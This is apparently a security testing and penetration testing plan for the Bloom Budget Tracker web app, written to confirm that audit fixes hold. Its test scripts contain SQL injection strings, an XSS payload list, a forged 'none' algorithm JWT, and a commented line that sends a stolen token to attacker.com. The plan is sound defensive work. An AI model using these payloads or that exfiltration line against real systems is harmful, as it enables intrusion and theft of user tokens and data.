# Security Testing Checklist & Penetration Testing Plan

## 🎯 Overview

Comprehensive security testing plan for Bloom Budget Tracker to validate remediation of audit findings and ensure overall security posture.

## 📋 Pre-Testing Setup

### Environment Preparation

-   [ ] Set up isolated testing environment (duplicate production)
-   [ ] Configure test user accounts with sample data
-   [ ] Deploy current vulnerable version for baseline testing
-   [ ] Set up monitoring and logging for test activities
-   [ ] Document baseline security configurations

### Testing Tools Installation

```bash
# Install security testing tools
npm install -g @lhci/cli                    # Lighthouse security audit
pip install bandit                          # Python security linting
npm install -g eslint-plugin-security       # JavaScript security linting
pip install sqlmap                          # SQL injection testing
npm install -g retire                       # JavaScript vulnerability scanning
```

## 🔍 Phase 1: Automated Security Scanning

### Static Code Analysis

```bash
# Python backend security scan
bandit -r backend/ -f json -o security-scan-backend.json

# JavaScript frontend security scan
npm audit --audit-level moderate
retire --path frontend/

# Dependency vulnerability check
safety check -r backend/requirements.txt
npm audit fix --dry-run
```

**Checklist:**

-   [ ] No critical vulnerabilities in dependencies
-   [ ] No hardcoded secrets detected
-   [ ] No insecure coding patterns found
-   [ ] All dependency vulnerabilities addressed

### OWASP ZAP Baseline Scan

```bash
# Run OWASP ZAP baseline scan
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-baseline.py \
    -t http://localhost:3000 \
    -g gen.conf \
    -r baseline-report.html
```

**Checklist:**

-   [ ] No high-risk vulnerabilities detected
-   [ ] Security headers properly configured
-   [ ] SSL/TLS configuration secure
-   [ ] No sensitive information disclosed

## 🔐 Phase 2: Authentication & Authorization Testing

### JWT Token Security Testing

#### Test JWT Storage Vulnerability (Pre-Fix)

```javascript
// Test script: jwt-storage-test.js
// Simulate XSS attack to steal JWT tokens

// 1. Login and obtain JWT
const loginResponse = await fetch("/api/v1/auth/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: "test@bloom.com", password: "password123" }),
});

// 2. Check if token accessible via localStorage
const storedToken = localStorage.getItem("access_token");
console.log("Token accessible via localStorage:", !!storedToken);

// 3. Simulate XSS token theft
if (storedToken) {
    console.log("🚨 VULNERABILITY: Token can be stolen via XSS");
    // In real attack: fetch('https://attacker.com/steal?token=' + storedToken)
}
```

#### Test httpOnly Cookie Implementation (Post-Fix)

```javascript
// Test that tokens are not accessible via JavaScript after fix
const tokenFromStorage = localStorage.getItem("access_token");
const tokenFromCookie = document.cookie.includes("access_token");

console.log("Token in localStorage:", !!tokenFromStorage); // Should be false
console.log("Cookie present (not accessible):", tokenFromCookie); // Should be true but not readable
```

### Secret Key Validation Testing

```bash
# Test that weak secrets are rejected in production
export SECRET_KEY="weak-secret"
export JWT_SECRET_KEY="another-weak-secret"
export FLASK_ENV="production"

# This should FAIL to start
python backend/app.py

# Expected: ValueError with clear error message about weak secrets
```

### Rate Limiting Testing

```python
# Test rate limiting bypass via restart
# File: test_rate_limiting.py
import requests
import time

def test_rate_limit_bypass():
    """Test rate limiting and restart bypass"""
    login_url = "http://localhost:5000/api/v1/auth/login"

    # Test normal rate limiting (should work)
    for i in range(6):  # Exceed 5 login limit
        response = requests.post(login_url, json={
            "email": "nonexistent@test.com",
            "password": "wrong"
        })
        print(f"Attempt {i+1}: {response.status_code}")

        if response.status_code == 429:
            print("✅ Rate limit working - blocked at attempt", i+1)
            return True

    print("🚨 Rate limit not working - all attempts succeeded")
    return False

# After implementing Redis rate limiting:
def test_rate_limit_persistence():
    """Test that rate limits persist across restarts"""
    # Hit rate limit
    test_rate_limit_bypass()

    # Restart server (simulate)
    print("Simulating server restart...")

    # Try again immediately
    response = requests.post(login_url, json={
        "email": "nonexistent@test.com",
        "password": "wrong"
    })

    if response.status_code == 429:
        print("✅ Rate limit persisted across restart")
        return True
    else:
        print("🚨 Rate limit was reset by restart")
        return False
```

**Authentication Testing Checklist:**

-   [ ] JWT tokens not accessible via localStorage after fix
-   [ ] httpOnly cookies properly set and secured
-   [ ] Weak secret keys rejected in production
-   [ ] Account lockout works after 5 failed attempts
-   [ ] Rate limiting persists across server restarts
-   [ ] Password reset tokens not exposed in API responses
-   [ ] Authentication bypass attempts fail

## 🛡️ Phase 3: Input Validation & XSS Testing

### SQL Injection Testing

```python
# Test maintenance scripts for SQL injection
# File: test_sql_injection.py

def test_maintenance_script_injection():
    """Test if maintenance scripts are vulnerable to SQL injection"""

    # Before fix: Test if raw SQL is used
    malicious_inputs = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --"
    ]

    # Test table name validation
    for malicious_input in malicious_inputs:
        try:
            # This should be rejected after implementing validation
            result = validate_table_name(malicious_input)
            print(f"🚨 VULNERABILITY: Accepted malicious input: {malicious_input}")
        except ValueError as e:
            print(f"✅ Correctly rejected: {malicious_input}")

# Test parameterized query implementation
def test_search_injection():
    """Test search functionality for SQL injection"""

    search_payloads = [
        "'; DROP TABLE expenses; --",
        "' UNION SELECT password FROM users --",
        "'; UPDATE expenses SET amount=0; --"
    ]

    for payload in search_payloads:
        response = requests.get(f"/api/v1/expenses?search={payload}")

        # Should return normal results, not execute SQL
        if response.status_code == 200:
            print(f"✅ Search handled safely: {payload}")
        else:
            print(f"🚨 Unexpected response to: {payload}")
```

### XSS Testing Suite

```javascript
// File: xss-test-payloads.js
const xssPayloads = [
    // Basic XSS
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',

    // Event handlers
    '<body onload=alert("XSS")>',
    '<div onmouseover=alert("XSS")>Hover me</div>',

    // JavaScript URLs
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(`XSS`)">',

    // HTML injection
    '"><script>alert("XSS")</script>',
    '<svg onload=alert("XSS")>',

    // CSS injection
    '<div style="background:url(javascript:alert(1))">',
    '<link rel=stylesheet href="javascript:alert(1)">',

    // Advanced XSS
    '<img src="/" =_=" title="onerror=alert(1)">',
    '<video><source onerror="alert(1)">',
];

async function testTransactionXSS() {
    console.log("🧪 Testing XSS in transaction fields...");

    for (const payload of xssPayloads) {
        try {
            // Test expense name field
            const response = await fetch("/api/v1/expenses", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    Authorization: "Bearer " + getAuthToken(),
                },
                body: JSON.stringify({
                    name: payload,
                    amount: 1000,
                    category: "Test",
                    date: "2025-01-01",
                }),
            });

            if (response.ok) {
                console.log(
                    `✅ Payload accepted (will test rendering): ${payload.substring(
                        0,
                        30
                    )}...`
                );

                // Check if payload is sanitized when displayed
                const expensesResponse = await fetch("/api/v1/expenses");
                const expenses = await expensesResponse.json();

                const lastExpense = expenses.data[0];
                if (
                    lastExpense.name.includes("<script>") ||
                    lastExpense.name.includes("onerror=")
                ) {
                    console.log(
                        `🚨 XSS VULNERABILITY: Payload not sanitized: ${lastExpense.name}`
                    );
                } else {
                    console.log(`✅ Payload sanitized: ${lastExpense.name}`);
                }
            }
        } catch (error) {
            console.log(
                `Error testing payload: ${payload.substring(0, 20)}...`
            );
        }
    }
}

// Test DOMPurify implementation
function testDOMPurifyImplementation() {
    console.log("🧪 Testing DOMPurify sanitization...");

    const testCases = [
        {
            input: '<script>alert("test")</script>',
            expected: "",
            description: "Script tags removed",
        },
        {
            input: "<img src=x onerror=alert(1)>",
            expected: '<img src="x">',
            description: "Event handlers removed",
        },
        {
            input: "Safe text with <b>formatting</b>",
            expected: "Safe text with formatting",
            description: "HTML tags removed but text preserved",
        },
    ];

    testCases.forEach((testCase) => {
        const sanitized = sanitizeText(testCase.input);
        if (sanitized === testCase.expected) {
            console.log(`✅ ${testCase.description}`);
        } else {
            console.log(`🚨 Failed: ${testCase.description}`);
            console.log(`   Input: ${testCase.input}`);
            console.log(`   Expected: ${testCase.expected}`);
            console.log(`   Got: ${sanitized}`);
        }
    });
}
```

**Input Validation Testing Checklist:**

-   [ ] All XSS payloads properly sanitized
-   [ ] SQL injection attempts blocked
-   [ ] Input validation rejects malicious content
-   [ ] DOMPurify correctly implemented
-   [ ] CSV import handles malicious content safely
-   [ ] Search functionality secure against injection

## 🌐 Phase 4: Infrastructure Security Testing

### CORS & CSP Testing

```javascript
// File: cors-csp-test.js

async function testCORSConfiguration() {
    console.log("🧪 Testing CORS configuration...");

    // Test that wildcard CORS is not allowed in production
    const corsTests = [
        { origin: "https://evil.com", expected: "blocked" },
        { origin: "https://bloom-tracker.app", expected: "allowed" },
        { origin: "http://localhost:3000", expected: "dev-only" },
        { origin: null, expected: "blocked" },
    ];

    for (const test of corsTests) {
        try {
            const response = await fetch("/api/v1/auth/me", {
                headers: { Origin: test.origin },
            });

            console.log(
                `Origin ${test.origin}: ${response.status} (${test.expected})`
            );
        } catch (error) {
            console.log(`Origin ${test.origin}: BLOCKED (${test.expected})`);
        }
    }
}

function testCSPViolations() {
    console.log("🧪 Testing Content Security Policy...");

    // Monitor CSP violations
    document.addEventListener("securitypolicyviolation", (e) => {
        console.log("CSP Violation:", {
            blockedURI: e.blockedURI,
            violatedDirective: e.violatedDirective,
            originalPolicy: e.originalPolicy,
        });
    });

    // Test inline script blocking
    try {
        eval('console.log("Inline eval test")');
        console.log("🚨 CSP VIOLATION: eval() executed");
    } catch (e) {
        console.log("✅ CSP blocked eval()");
    }

    // Test inline script injection
    const script = document.createElement("script");
    script.textContent = 'console.log("Inline script test")';
    document.body.appendChild(script);

    setTimeout(() => {
        if (window.inlineScriptExecuted) {
            console.log("🚨 CSP VIOLATION: Inline script executed");
        } else {
            console.log("✅ CSP blocked inline script");
        }
    }, 100);
}
```

### Security Headers Testing

```bash
# Test security headers with curl
curl -I http://localhost:5000/api/v1/auth/me

# Expected headers:
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# X-XSS-Protection: 1; mode=block
# Content-Security-Policy: [strict policy]
# Strict-Transport-Security: [production only]
```

**Infrastructure Testing Checklist:**

-   [ ] Wildcard CORS not enabled in any environment
-   [ ] CSP blocks inline scripts and eval()
-   [ ] Security headers properly configured
-   [ ] HTTPS enforced in production
-   [ ] Environment variables properly validated

## 🔍 Phase 5: Information Disclosure Testing

### Console Logging Analysis

```javascript
// File: console-disclosure-test.js

function analyzeConsoleOutput() {
    console.log("🧪 Analyzing console output for sensitive data...");

    // Override console methods to capture output
    const originalError = console.error;
    const originalWarn = console.warn;
    const capturedLogs = [];

    console.error = (...args) => {
        capturedLogs.push({ level: "error", args });
        originalError(...args);
    };

    console.warn = (...args) => {
        capturedLogs.push({ level: "warn", args });
        originalWarn(...args);
    };

    // Trigger various error conditions
    setTimeout(() => {
        // Analyze captured logs
        const sensitivePatterns = [
            /token/i,
            /password/i,
            /secret/i,
            /key/i,
            /Bearer /i,
            /@.*\.com/, // email addresses
            /\b\d{16}\b/, // potential card numbers
        ];

        capturedLogs.forEach((log) => {
            const logString = JSON.stringify(log.args);
            sensitivePatterns.forEach((pattern) => {
                if (pattern.test(logString)) {
                    console.log(
                        `🚨 SENSITIVE DATA in ${log.level}:`,
                        logString.substring(0, 100)
                    );
                }
            });
        });

        console.log(`✅ Analyzed ${capturedLogs.length} console entries`);

        // Restore console
        console.error = originalError;
        console.warn = originalWarn;
    }, 5000);
}
```

### Error Message Testing

```python
# File: error-disclosure-test.py
import requests

def test_error_message_disclosure():
    """Test that error messages don't leak sensitive information"""

    test_cases = [
        {
            'url': '/api/v1/auth/login',
            'data': {'email': 'admin@internal.com', 'password': 'wrong'},
            'check_for': ['database', 'sql', 'server', 'internal', 'stack trace']
        },
        {
            'url': '/api/v1/expenses/99999',
            'data': None,
            'check_for': ['database', 'table', 'sql', 'filesystem']
        }
    ]

    for test in test_cases:
        if test['data']:
            response = requests.post(f"http://localhost:5000{test['url']}", json=test['data'])
        else:
            response = requests.get(f"http://localhost:5000{test['url']}")

        error_text = response.text.lower()
        for sensitive_info in test['check_for']:
            if sensitive_info in error_text:
                print(f"🚨 INFORMATION DISCLOSURE: {sensitive_info} in {test['url']}")
            else:
                print(f"✅ No {sensitive_info} disclosure in {test['url']}")
```

## 📊 Phase 6: Penetration Testing Scenarios

### Scenario 1: Authentication Bypass

```python
# File: pentest-auth-bypass.py

def test_authentication_bypass():
    """Comprehensive authentication bypass testing"""

    bypass_attempts = [
        # JWT manipulation
        {'token': 'Bearer invalid.jwt.token', 'description': 'Invalid JWT'},
        {'token': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K', 'description': 'None algorithm JWT'},

        # SQL injection in auth
        {'email': "admin' OR '1'='1'--", 'password': 'any', 'description': 'SQL injection login'},

        # Header manipulation
        {'headers': {'X-User-ID': '1'}, 'description': 'Header injection'},

        # Session fixation
        {'cookies': {'session': 'fixed_session_id'}, 'description': 'Session fixation'},
    ]

    for attempt in bypass_attempts:
        print(f"Testing: {attempt['description']}")
        # Test implementation here
        result = test_bypass_attempt(attempt)
        if result:
            print(f"🚨 VULNERABILITY: {attempt['description']} succeeded")
        else:
            print(f"✅ Protected against: {attempt['description']}")
```

### Scenario 2: Data Exfiltration

```javascript
// File: pentest-data-exfiltration.js

async function testDataExfiltration() {
    console.log("🧪 Testing data exfiltration vectors...");

    const exfiltrationTests = [
        // CSV export manipulation
        {
            endpoint: "/api/v1/export",
            method: "POST",
            data: { format: "csv", date_range: "all" },
            description: "Export all user data",
        },

        // Transaction enumeration
        {
            endpoint: "/api/v1/expenses",
            method: "GET",
            params: { limit: 10000 },
            description: "Mass transaction export",
        },

        // User information leakage
        {
            endpoint: "/api/v1/auth/me",
            method: "GET",
            description: "User profile information",
        },
    ];

    for (const test of exfiltrationTests) {
        console.log(`Testing: ${test.description}`);

        try {
            const response = await fetch(test.endpoint, {
                method: test.method,
                headers: { Authorization: getAuthToken() },
            });

            if (response.ok) {
                const data = await response.json();
                console.log(
                    `Data size: ${JSON.stringify(data).length} characters`
                );

                // Check for sensitive data
                const dataString = JSON.stringify(data).toLowerCase();
                if (
                    dataString.includes("password") ||
                    dataString.includes("secret")
                ) {
                    console.log("🚨 SENSITIVE DATA exposed in response");
                } else {
                    console.log("✅ No obvious sensitive data");
                }
            }
        } catch (error) {
            console.log(`Error in ${test.description}:`, error.message);
        }
    }
}
```

## 📋 Final Security Validation Checklist

### Critical Fixes Validation

-   [ ] **Secret Keys**: Production startup fails with weak secrets
-   [ ] **JWT Storage**: Tokens not accessible via localStorage
-   [ ] **SQL Injection**: All raw SQL queries parameterized/validated
-   [ ] **Token Exposure**: No tokens in API responses or logs

### High Priority Fixes Validation

-   [ ] **Rate Limiting**: Persists across server restarts
-   [ ] **XSS Prevention**: All user input sanitized with DOMPurify
-   [ ] **CORS**: No wildcard origins in any environment
-   [ ] **CSP**: Blocks unsafe content execution

### Medium/Low Priority Fixes Validation

-   [ ] **Console Logging**: No sensitive data in production logs
-   [ ] **Error Messages**: Generic errors in production
-   [ ] **Input Validation**: All forms validate and sanitize input
-   [ ] **Security Headers**: All recommended headers present

### Deployment Security Validation

-   [ ] **Environment Variables**: All secrets properly configured
-   [ ] **HTTPS**: Enforced in production with HSTS
-   [ ] **Database**: Secured with proper connection settings
-   [ ] **Monitoring**: Security events logged appropriately

## 🔧 Automated Testing Integration

### GitHub Actions Security Tests

```yaml
# .github/workflows/security-tests.yml
name: Security Tests

on:
    pull_request:
        branches: [main]
    schedule:
        - cron: "0 2 * * 1" # Weekly Monday 2 AM

jobs:
    security-scan:
        runs-on: ubuntu-latest
        steps:
            - uses: actions/checkout@v3

            - name: Security Audit - Backend
              run: |
                  pip install bandit safety
                  bandit -r backend/ -f json -o bandit-report.json
                  safety check -r backend/requirements.txt

            - name: Security Audit - Frontend
              run: |
                  cd frontend
                  npm audit --audit-level moderate
                  npm install -g retire
                  retire --path .

            - name: OWASP ZAP Scan
              uses: zaproxy/action-baseline@v0.7.0
              with:
                  target: "http://localhost:3000"

            - name: Upload Security Reports
              uses: actions/upload-artifact@v3
              with:
                  name: security-reports
                  path: |
                      bandit-report.json
                      zap-report.html
```

### Pre-commit Security Hooks

```yaml
# .pre-commit-config.yaml
repos:
    - repo: https://github.com/PyCQA/bandit
      rev: 1.7.4
      hooks:
          - id: bandit
            args: ["-r", "backend/"]

    - repo: https://github.com/Yelp/detect-secrets
      rev: v1.4.0
      hooks:
          - id: detect-secrets
            args: ["--baseline", ".secrets.baseline"]

    - repo: local
      hooks:
          - id: security-audit
            name: npm security audit
            entry: npm audit
            language: system
            files: package\.json
```

## 📈 Success Metrics

### Security Testing KPIs

-   **Vulnerability Coverage**: 100% of identified vulnerabilities tested
-   **False Positive Rate**: <5% of flagged issues
-   **Test Automation**: 90% of tests automated in CI/CD
-   **Response Time**: Security fixes validated within 24 hours

### Security Posture Goals

-   **Zero Critical Vulnerabilities**: No unpatched critical issues
-   **OWASP ZAP Baseline**: Clean scan results
-   **Dependency Security**: No high-risk dependency vulnerabilities
-   **Code Security**: Bandit/ESLint security rules passing

---

**Final Note**: This testing plan should be executed iteratively as security fixes are implemented. Start with manual testing for immediate validation, then build automated tests for continuous security monitoring.
